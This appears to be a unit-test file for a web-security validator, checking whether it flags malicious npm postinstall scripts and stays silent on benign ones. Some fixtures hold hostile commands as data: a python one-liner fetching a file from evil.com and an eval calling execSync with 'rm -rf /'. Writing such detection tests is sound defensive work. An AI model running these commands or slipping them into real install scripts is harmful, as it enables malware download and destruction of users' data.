import unittest
from websec_validator.extractors.dependencies import DependenciesExtractor
from websec_validator.extractors.base import RepoContext

class FP_DependenciesTests(unittest.TestCase):
    def _run(self, scripts: dict) -> dict:
        import tempfile
        import json
        from pathlib import Path
        d = Path(tempfile.mkdtemp())
        (d / "package.json").write_text(json.dumps({
            "name": "safe-app",
            "scripts": scripts
        }))
        return DependenciesExtractor().extract(RepoContext(d), {})

    def test_benign_node_e_silent(self):
        # FP: node -e logging a string
        f = self._run({"postinstall": "node -e 'console.log(\"done\")'"})
        self.assertNotIn("malicious-install-script", [x["kind"] for x in f["findings"]])

    def test_malicious_node_e_fires(self):
        # TP: node -e requiring fs to write a file
        f = self._run({"postinstall": "node -e 'require(\"fs\").writeFileSync(\"out.txt\", \"hello\")'"})
        self.assertIn("malicious-install-script", [x["kind"] for x in f["findings"]])

    def test_benign_python_c_silent(self):
        # FP: python -c printing a string
        f = self._run({"postinstall": "python -c 'print(\"done\")'"})
        self.assertNotIn("malicious-install-script", [x["kind"] for x in f["findings"]])

    def test_malicious_python_c_fires(self):
        # TP: python -c downloading a file
        f = self._run({"postinstall": "python -c 'import urllib.request; urllib.request.urlretrieve(\"http://evil.com/malware\", \"malware\")'"})
        self.assertIn("malicious-install-script", [x["kind"] for x in f["findings"]])

    def test_benign_eval_silent(self):
        # FP: eval logging a string
        f = self._run({"postinstall": "eval('console.log(\"done\")')"})
        self.assertNotIn("malicious-install-script", [x["kind"] for x in f["findings"]])

    def test_malicious_eval_fires(self):
        # TP: eval executing a command
        f = self._run({"postinstall": "eval('require(\"child_process\").execSync(\"rm -rf /\")')"})
        self.assertIn("malicious-install-script", [x["kind"] for x in f["findings"]])
